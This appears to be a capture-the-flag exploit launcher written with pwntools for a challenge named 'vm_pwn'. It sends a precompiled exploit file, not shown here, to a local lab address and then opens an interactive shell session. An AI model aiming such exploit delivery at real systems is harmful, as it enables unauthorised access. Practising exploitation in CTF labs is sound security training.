from pwn import *
cexp = open('compiled_exp', 'rb').read()
p = remote('172.17.0.2', 1337)
#p = process('./vm_pwn')
#gdb.attach(p)
p.recvlines(2)
p.send(p32(len(cexp)))
p.send(cexp)
p.interactive()
